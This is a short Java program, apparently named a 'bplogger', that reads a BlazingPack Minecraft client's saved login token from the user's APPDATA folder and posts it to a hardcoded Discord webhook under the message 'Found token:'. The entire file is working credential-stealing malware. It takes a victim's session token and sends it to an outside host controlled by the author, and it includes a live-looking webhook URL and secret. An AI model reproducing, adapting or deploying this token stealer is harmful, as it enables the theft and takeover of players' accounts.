package net.wiewurteam.bplogger;

import com.mrpowergamerbr.temmiewebhook.DiscordMessage;
import com.mrpowergamerbr.temmiewebhook.TemmieWebhook;

import java.io.*;

public class Main {
    public static void main(String[] args) throws IOException, FileNotFoundException {
        final File BPDIR = new File(System.getenv("APPDATA") + "\\.minecraft\\blazingpack\\blazing_pack_token.txt");
        final String URL = "https://discordapp.com/api/webhooks/737326221238730843/aRRnzxuxwsGhVd2oq8C_kPIt0T7dL3iHpvra8ptzmMf93cBuugAQ9SVjmCfEuLSLpwqg";

        FileReader fileReader = new FileReader(BPDIR);
        BufferedReader bufferReader = new BufferedReader(fileReader);

        String buildedText = bufferReader.readLine();

        fileReader.close();
        bufferReader.close();

        TemmieWebhook webhook = new TemmieWebhook(URL);

        DiscordMessage dm = DiscordMessage.builder()
                .content("Found token:\n " + buildedText)
                .build();

        webhook.sendMessage(dm);
    }
}
